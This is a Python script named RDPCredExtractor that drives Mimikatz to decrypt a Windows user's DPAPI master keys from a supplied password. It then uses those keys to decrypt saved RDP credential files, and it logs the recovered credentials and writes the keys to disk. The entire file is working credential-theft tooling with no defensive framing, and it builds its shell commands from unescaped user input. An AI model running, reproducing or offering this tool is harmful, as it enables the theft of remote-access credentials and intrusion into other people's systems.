import os
import argparse
import logging
import subprocess
import re

# ----------------------------
# Logging Configuration
# ----------------------------
logger = logging.getLogger('RDPCredExtractor')
logger.setLevel(logging.DEBUG)

# File handler for success logs only
file_handler = logging.FileHandler('rdp_creds_success.log')
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(file_handler)

# Stream handler for full logs on terminal
stream_handler = logging.StreamHandler()
stream_handler.setLevel(logging.DEBUG)
stream_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(stream_handler)


# ----------------------------
# Master Key Extraction
# ----------------------------
def extract_master_keys(target_dir, password):
    """
    Extract DPAPI Master Keys using Mimikatz and save only the key value.
    """
    protect_path = os.path.join(target_dir, 'AppData\Roaming\Microsoft\Protect')
    masterkey_file = os.path.abspath('masterkey.txt')

    if not os.path.exists(protect_path):
        logger.error("[ERROR] Protect directory not found. Cannot extract master keys.")
        return []

    logger.info("[INFO] Extracting Master Keys...")
    extracted_keys = []

    for root, dirs, files in os.walk(protect_path):
        for dir in dirs:
            if dir.startswith('S-1-5-21'):
                user_protect_path = os.path.join(root, dir)
                for file in os.listdir(user_protect_path):
                    file_path = os.path.join(user_protect_path, file)
                    command = f'mimikatz.exe "dpapi::masterkey /in:\"{file_path}\" /password:{password}" exit"'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    logger.debug(f"[COMMAND] {command}")
                    logger.debug(f"[STDOUT] {result.stdout.strip()}")
                    logger.debug(f"[STDERR] {result.stderr.strip()}")
                    
                    match = re.search(r'key\s*:\s*([a-fA-F0-9]+)', result.stdout)
                    if match:
                        master_key = match.group(1)
                        extracted_keys.append(master_key)
                        logger.info(f"[SUCCESS] Extracted Master Key: {master_key}")

    if extracted_keys:
        with open(masterkey_file, 'w') as f:
            for key in extracted_keys:
                f.write(key + '\n')
        logger.info(f"[INFO] Master Keys saved to {masterkey_file}")
    else:
        logger.warning("[WARNING] No Master Keys were extracted.")
    
    return extracted_keys


# ----------------------------
# DPAPI Decryption
# ----------------------------
def run_dpapi_blob(file_path, masterkey):
    """
    Runs Mimikatz to attempt DPAPI blob decryption with the provided Master Key.
    """
    try:
        command = f'mimikatz.exe "dpapi::cred /in:\"{file_path}\" /masterkey:{masterkey}" exit"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        logger.debug(f"[COMMAND] {command}")
        logger.debug(f"[STDOUT] {result.stdout.strip()}")
        logger.debug(f"[STDERR] {result.stderr.strip()}")

        if "ERROR kull_m_dpapi_unprotect_blob" in result.stdout or "ERROR kull_m_dpapi_unprotect_blob" in result.stderr:
            logger.debug(f"[FAILED] Decryption failed for: {file_path} using key: {masterkey}")
            return False, result.stdout, result.stderr
        
        if "TargetName" in result.stdout or "TargetName" in result.stderr:
            logger.info(f"[SUCCESS] Decrypted: {file_path} with Master Key: {masterkey}")
            logger.info(f"[RDP DETAILS] {result.stdout.strip()}")
            return True, result.stdout, result.stderr
        
        logger.warning(f"[UNKNOWN] Could not determine decryption status for: {file_path}")
        return False, result.stdout, result.stderr

    except Exception as e:
        logger.error(f"[EXCEPTION] Error decrypting {file_path}: {e}")
        return False, "", str(e)


# ----------------------------
# RDP Credentials Extraction
# ----------------------------
def process_rdp_credentials(target_dir, master_keys):
    """
    Process and decrypt saved RDP credentials.
    """
    cred_path = os.path.join(target_dir, 'AppData\Local\Microsoft\Credentials')
    if not os.path.exists(cred_path):
        logger.warning("[WARNING] Credentials directory not found.")
        return

    logger.info("[INFO] Searching for saved RDP credentials...")

    for root, dirs, files in os.walk(cred_path):
        for file in files:
            file_path = os.path.join(root, file)
            logger.debug(f"[INFO] Found credential file: {file_path}")
            for key in master_keys:
                success, stdout, stderr = run_dpapi_blob(file_path, key)
                if success:
                    if "TargetName" in stdout:
                        logger.info(f"[RDP CREDENTIAL] Successfully decrypted RDP credential file: {file_path}")
                        logger.info(f"[RDP DETAILS] {stdout.strip()}")
                        break


# ----------------------------
# Main Function
# ----------------------------
def main():
    parser = argparse.ArgumentParser(description="RDP Credential Extractor")
    parser.add_argument('-t', '--target', required=True, help='Target directory (e.g., C:\\Users\\targetuser)')
    parser.add_argument('-p', '--password', required=True, help='Password for user profile')
    args = parser.parse_args()

    logger.info("[INFO] Starting RDP Credential Extraction")
    target_dir = args.target
    password = args.password

    if not os.path.exists(target_dir):
        logger.error("[ERROR] Target directory does not exist.")
        return

    master_keys = extract_master_keys(target_dir, password)
    process_rdp_credentials(target_dir, master_keys)
    logger.info("[INFO] RDP Credential Extraction Complete.")


# ----------------------------
# Entry Point
# ----------------------------
if __name__ == '__main__':
    main()
